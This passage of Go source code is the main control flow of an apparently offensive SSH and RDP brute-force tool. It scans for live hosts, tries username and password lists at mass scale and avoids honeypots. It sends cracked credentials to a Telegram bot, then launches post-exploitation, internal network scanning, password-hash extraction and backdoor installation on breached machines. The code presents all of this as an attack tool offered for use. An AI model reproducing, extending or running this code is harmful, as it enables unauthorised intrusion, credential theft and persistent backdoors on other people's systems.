		fmt.Printf("[SCAN] Complete! Total open ports: %d | Time: %v\n", totalOpen, scanDuration.Round(time.Millisecond))
		fmt.Printf("[SCAN] Results saved to open_ports.txt\n\n")

		if *usersFlag == "" && *passwordsFlag == "" && *credsFile == "" {
			os.Exit(0)
		}
	}

	if *aliveFlag && len(hosts) > 0 {
		portVal := port
		if portVal == "" {
			portVal = "22"
		}
		fmt.Printf("\n[ALIVE] Checking %d hosts on port %s\n", len(hosts), portVal)
		aliveHosts := checkAlive(hosts, portVal, timeout, threads)
		fmt.Printf("\n[ALIVE] %d/%d hosts alive\n", len(aliveHosts), len(hosts))
		fmt.Printf("[SAVED] LIVE.txt (%d hosts added)\n\n", len(aliveHosts))
		hosts = aliveHosts

		if *usersFlag == "" && *passwordsFlag == "" && *credsFile == "" {
			if len(aliveHosts) == 0 {
				fmt.Printf("%s[!] No alive hosts found%s\n", colors.Yellow, colors.Reset)
			}
			os.Exit(0)
		}
	}

	if len(hosts) == 0 && targets != "" {
		fmt.Printf("%s[ERROR] No valid hosts found%s\n", colors.Red, colors.Reset)
		os.Exit(1)
	}

	var userList, passList []string

	if *credsFile != "" {
		u, p, err := readCredsFile(*credsFile)
		if err == nil && len(u) > 0 {
			userList, passList = u, p
			fmt.Printf("[CREDS] Loaded %d credentials\n", len(userList))
		}
	} else {
		if users != "" {
			userList = getListFromInput(users)
			fmt.Printf("[USERS] Loaded %d users\n", len(userList))
			
			for i, u := range userList {
				fmt.Printf("  User[%d]: '%s' (len=%d)\n", i, u, len(u))
			}
			
		}
		if passwords != "" {
			passList = getListFromInput(passwords)
			fmt.Printf("[PASSWORDS] Loaded %d passwords\n", len(passList))
			
			for i, p := range passList {
				fmt.Printf("  Pass[%d]: '%s' (len=%d)\n", i, p, len(p))
			}
			
		}
		if len(userList) == 1 && len(passList) == 0 && strings.Contains(userList[0], ":") {
			parts := strings.SplitN(userList[0], ":", 2)
			userList = []string{parts[0]}
			passList = []string{parts[1]}
			fmt.Printf("[PARSED] User: %s | Pass: %s\n", userList[0], passList[0])
		}
	}

	if protocol != "ssh" && protocol != "rdp" {
		fmt.Printf("%s[ERROR] Invalid protocol: %s. Use ssh or rdp%s\n", colors.Red, protocol, colors.Reset)
		os.Exit(1)
	}

	if len(hosts) > 0 && len(userList) == 0 && *targetsFlag != "" {
		fmt.Printf("%s[ERROR] No users specified! Use -users or -creds%s\n", colors.Red, colors.Reset)
		os.Exit(1)
	}
	if len(hosts) > 0 && len(passList) == 0 && protocol == "ssh" && *targetsFlag != "" {
		fmt.Printf("%s[ERROR] No passwords specified! Use -passwords or -creds%s\n", colors.Red, colors.Reset)
		os.Exit(1)
	}

	if len(hosts) > 0 && len(userList) > 0 && len(passList) > 0 {
		fmt.Printf("\n%s═══════════════════════════════════════════════════════════════%s\n", colors.Cyan, colors.Reset)
		fmt.Printf("%s[CONFIG] Protocol: %s | Hosts: %d | Users: %d | Passwords: %d%s\n",
			colors.Green, protocol, len(hosts), len(userList), len(passList), colors.Reset)
		fmt.Printf("%s[CONFIG] Crack Threads: %d | Timeout: %ds%s\n",
			colors.Green, *crackThreads, *crackTimeout, colors.Reset)
		fmt.Printf("%s═══════════════════════════════════════════════════════════════%s\n\n", colors.Cyan, colors.Reset)
	}

	if *botToken != "" {
		config.TelegramToken = *botToken
	}
	if *chatID != "" {
		config.TelegramChatID = *chatID
	}
	if config.TelegramToken != "" && config.TelegramChatID != "" {
		internal.InitTelegramLimiter()
	}

	if *multiCity {
		fmt.Printf("%s[MULTI-CITY] Routing through %d cities worldwide%s\n", colors.Cyan, len(prtl.CityRoutes), colors.Reset)
		for _, city := range prtl.CityRoutes {
			fmt.Printf("  - %s (latency: %dms)\n", city.Name, city.Latency)
		}
	}

	backdoorCfg := ex.BackdoorConfig{
		Enabled:  *backdoorEnabled,
		Type:     *backdoorType,
		Port:     *backdoorPort,
		User:     *backdoorUser,
		Password: *backdoorPass,
		SSHKey:   *backdoorKey,
	}

	if *monitor {
		go func() {
			ticker := time.NewTicker(10 * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				var memStats runtime.MemStats
				runtime.ReadMemStats(&memStats)
				goroutines := runtime.NumGoroutine()
				fmt.Printf("\r%s[MONITOR] Goroutines: %d | Memory: %.2f MB | Attempts: %d | Cracked: %d%s",
					colors.Cyan, goroutines, float64(memStats.Alloc)/1024/1024, prtl.TotalAttempts, len(crackedList), colors.Reset)
			}
		}()
	}

	crackedBuffer = prtl.NewCircularBuffer("Cracked.txt", maxFileBuffer)
	defer crackedBuffer.Close()
	prtl.SetCrackedBuffer(crackedBuffer)

	hostPortMap := make(map[string]string)
	cleanHosts := []string{}
	for _, item := range hosts {
		if strings.Contains(item, ":") {
			parts := strings.SplitN(item, ":", 2)
			cleanHosts = append(cleanHosts, parts[0])
			hostPortMap[parts[0]] = parts[1]
		} else {
			cleanHosts = append(cleanHosts, item)
		}
	}
	hosts = cleanHosts

	portVal := port
	if portVal == "" {
		switch protocol {
		case "ssh":
			portVal = "22"
		case "rdp":
			portVal = "3389"
		default:
			portVal = "22"
		}
	}

	var cp *prtl.Checkpoint
	startIdx := 0
	if *resume {
		var err error
		cp, err = prtl.LoadCheckpoint()
		if err == nil && cp != nil && !cp.Completed {
			fmt.Printf("[RESUME] Restoring from checkpoint\n")
			startIdx = cp.HostIndex
			portVal = cp.Port
			timeout = cp.Timeout
		}
	}
	if cp == nil {
		cp = &prtl.Checkpoint{
			CrackedMap:  make(map[string]string),
			FailedHosts: make(map[string]int),
			BannedHosts: make(map[string]string),
		}
	}

	var aliveHosts []string
	if !*skipAlive && len(cp.Hosts) == 0 && !*massPwn && len(hosts) > 0 && len(userList) > 0 {
		fmt.Printf("[SCAN] Checking %d hosts...\n", len(hosts))
		var wg sync.WaitGroup
		aliveChan := make(chan string, len(hosts))
		var aliveMu sync.Mutex
		workerCount := threads
		if workerCount > 1000 {
			workerCount = 1000
		}
		if workerCount < 1 {
			workerCount = 100
		}
		sem := make(chan struct{}, workerCount)
		for i := 0; i < workerCount; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for h := range aliveChan {
					select {
					case sem <- struct{}{}:
						usePort := portVal
						if customPort, ok := hostPortMap[h]; ok {
							usePort = customPort
						}
						if prtl.IsHostBanned(h, cp) {
							<-sem
							continue
						}
						if isAlive(h, usePort, timeout) {
							aliveMu.Lock()
							aliveHosts = append(aliveHosts, h)
							aliveMu.Unlock()
							fmt.Printf("  %s%s:%s ALIVE%s\n", colors.Green, h, usePort, colors.Reset)
							saveLiveHost(h, usePort)
						} else {
							fmt.Printf("  %s%s:%s DEAD%s\n", colors.Red, h, usePort, colors.Reset)
							cp.Lock()
							if cp.FailedHosts == nil {
								cp.FailedHosts = make(map[string]int)
							}
							cp.FailedHosts[h] = cp.FailedHosts[h] + 1
							cp.Unlock()
						}
						<-sem
					default:
						time.Sleep(10 * time.Millisecond)
						aliveChan <- h
					}
				}
			}()
		}
		for _, h := range hosts {
			aliveChan <- h
		}
		close(aliveChan)
		wg.Wait()
		fmt.Printf("[LIVE] %d/%d hosts alive\n", len(aliveHosts), len(hosts))
		cp.Hosts = aliveHosts
		prtl.SaveCheckpoint(cp)
	} else if len(cp.Hosts) > 0 {
		aliveHosts = cp.Hosts
		fmt.Printf("[RESUME] Using %d hosts from checkpoint\n", len(aliveHosts))
	}

	if len(aliveHosts) == 0 && !*skipAlive && !*massPwn && len(hosts) > 0 && len(userList) > 0 {
		fmt.Printf("%s[!] No alive hosts%s\n", colors.Yellow, colors.Reset)
		os.Exit(1)
	}
	if len(aliveHosts) == 0 && *skipAlive {
		aliveHosts = hosts
	}
	if len(aliveHosts) == 0 && len(hosts) == 0 {
		aliveHosts = hosts
	}

	if len(aliveHosts) == 0 && (len(userList) > 0 || *targetsFlag != "") {
		fmt.Printf("%s[!] No hosts to attack%s\n", colors.Yellow, colors.Reset)
		os.Exit(0)
	}

	if len(aliveHosts) > 0 && len(userList) > 0 && len(passList) > 0 {
		honeypotCount := 0
		bannedCount := len(cp.BannedHosts)
		if *honeypotCheck && len(aliveHosts) > 0 && !*massPwn {
			fmt.Printf("[HONEYPOT] Checking for honeypots...\n")
			checkLimit := min(10, len(aliveHosts))
			for i := 0; i < checkLimit; i++ {
				host := aliveHosts[i]
				banner, err := prtl.GetFullSSHBanner(host, portVal, timeout)
				if err == nil {
					analysis := hp.DetectHoneypot(host, portVal, banner, timeout)
					if analysis.IsHoneypot {
						honeypotCount++
						banHost(host, analysis.Reason, cp)
						if config.TelegramToken != "" && config.TelegramChatID != "" {
							go internal.SendTelegramNotification("honeypot", map[string]interface{}{
								"host":       host,
								"port":       portVal,
								"confidence": analysis.Confidence * 100,
								"reason":     analysis.Reason,
							})
						}
					}
					fmt.Printf("  %s: %.0f%% confidence (response: %dms, hash: %s)\n", host, analysis.Confidence*100, analysis.ResponseTime, analysis.BannerHash[:8])
				}
				time.Sleep(100 * time.Millisecond)
			}
			fmt.Println()
		}

		if *attackMode != "normal" && len(userList) > 0 && len(hosts) > 0 {
			fmt.Printf("[ATTACK MODE] Using %s mode\n", *attackMode)
			for _, host := range hosts {
				for _, user := range userList {
					var success bool
					switch *attackMode {
					case "null":
						success = attackModeNull(host, portVal, user, timeout, protocol)
					case "userpass":
						success = attackModeUserAsPass(host, portVal, user, timeout, protocol)
					case "reverse":
						success = attackModeReverseUser(host, portVal, user, timeout, protocol)
					}
					if success {
						fmt.Printf("\n%sok %s MODE CRACKED:%s %s@%s (no password needed)\n",
							colors.Green, strings.ToUpper(*attackMode), colors.Reset, user, host)
					}
				}
			}
		}

		if protocol == "ssh" {
			if len(userList) == 0 {
				fmt.Printf("%s[ERROR] ssh needs -users or -creds%s\n", colors.Red, colors.Reset)
				os.Exit(1)
			}

			prtl.SetSSHResultCallback(func(host, port, user, pass string) {
				if isDuplicate(host, port, user, pass) {
					return
				}
				saveCracked(host, port, user, pass, "SSH")

				if notify == 1 && config.TelegramToken != "" && config.TelegramChatID != "" {
					go internal.SendTelegramNotification("cracked", map[string]interface{}{
						"host": host, "port": port, "user": user, "pass": pass, "banner": "SSH",
					})
				}

				if *postExploit {
					go ex.P0stExploit(host, port, user, pass)
				}
				if *scanNetwork {
					go prtl.ScanInternalNetwork(host, port, user, pass)
				}
				if *extractHash {
					go ex.ExtractHashes(host, port, user, pass)
				}
				if *backdoorEnabled {
					go ex.InstallBackdoor(host, port, user, pass, backdoorCfg)
				}
			})

			sshConfig := prtl.SSHCrackerConfig{
				Hosts:          aliveHosts,
				Port:           portVal,
				Users:          userList,
				Passwords:      passList,
				Timeout:        *crackTimeout,
				Workers:        *crackThreads,
				MinDelay:       *minDelay,
				MaxDelay:       *maxDelay,
				Notify:         notify,
				SmartPass:      *smartPass,
				PostExploit:    *postExploit,
				ScanNetwork:    *scanNetwork,
				ExtractHash:    *extractHash,
				GenerateScript: *generateScript,
				ResumeIdx:      startIdx,
				Checkpoint:     cp,
				Backdoor:       backdoorCfg,
				DoBackdoor:     *backdoorEnabled,
				MultiCity:      *multiCity,
				MassPwn:        *massPwn,
				TelegramToken:  config.TelegramToken,
				TelegramChatID: config.TelegramChatID,
			}

			result := prtl.RunSSHCracker(sshConfig)

			crackedMu.Lock()
			for _, entry := range result.CrackedList {
				exists := false
				for _, existing := range crackedList {
					if existing == entry {
						exists = true
						break
					}
				}
				if !exists {
					crackedList = append(crackedList, entry)
				}
			}
			crackedMu.Unlock()

			prtl.TotalAttempts = result.TotalAttempts
			prtl.SuccessAttempts = result.SuccessCount
			prtl.FailedAttempts = result.FailedCount
		} else if protocol == "rdp" {
			if len(userList) == 0 || len(passList) == 0 {
				fmt.Printf("%s[ERROR] rdp needs -users and -passwords or -creds%s\n", colors.Red, colors.Reset)
				os.Exit(1)
			}

			prtl.SetRDPSuccessCallback(func(host, port, user, pass string) {
				if isDuplicate(host, port, user, pass) {
					return
				}
				saveCracked(host, port, user, pass, "RDP")

				if notify == 1 && config.TelegramToken != "" && config.TelegramChatID != "" {
					go internal.SendTelegramNotification("cracked", map[string]interface{}{
						"host": host, "port": port, "user": user, "pass": pass, "banner": "RDP",
					})
				}

				if *postExploit {
					go ex.P0stExploit(host, port, user, pass)
				}
				if *backdoorEnabled {
					go ex.InstallBackdoor(host, port, user, pass, backdoorCfg)
				}
				if *extractHash {
					go ex.ExtractHashes(host, port, user, pass)
				}
			})

			prtl.SetRDPGlobals(cp, *postExploit, *backdoorEnabled, *extractHash,
				*scanNetwork, backdoorCfg, notify == 1)

			prtl.MaxConcurrent = *crackThreads

			prtl.RunRDP(aliveHosts, portVal, userList, passList, *crackTimeout)

			prtl.TotalAttempts = prtl.TotalAttempts
			prtl.SuccessAttempts = prtl.SuccessAttempts
			prtl.FailedAttempts = prtl.FailedAttempts
			
		} else {
			fmt.Printf("%s[ERROR] Unsupported protocol: %s. Only ssh and rdp are supported%s\n", colors.Red, protocol, colors.Reset)
			os.Exit(1)
		}

		fmt.Printf("\n%s[DONE] Time: %s | Attempts: %d | Success: %d | Failed: %d | Cracked: %d | Honeypots: %d | Banned: %d%s\n",
			colors.Cyan, time.Since(startTime).Round(time.Second), prtl.TotalAttempts, prtl.SuccessAttempts, prtl.FailedAttempts, len(crackedList), honeypotCount, bannedCount, colors.Reset)

		if *outputJSON || *outputCSV {
			exportResults(crackedList, prtl.CompletedHosts, prtl.TotalAttempts, prtl.SuccessAttempts, honeypotCount, bannedCount)
		}

		if notify == 2 && config.TelegramToken != "" && config.TelegramChatID != "" {
			go internal.SendTelegramNotification("scan_complete", map[string]interface{}{
				"duration":       time.Since(startTime).Round(time.Second).String(),
				"cracked_count":  len(crackedList),
				"honeypot_count": honeypotCount,
			})
		}
	}

	os.Remove(prtl.CheckpointFile)
}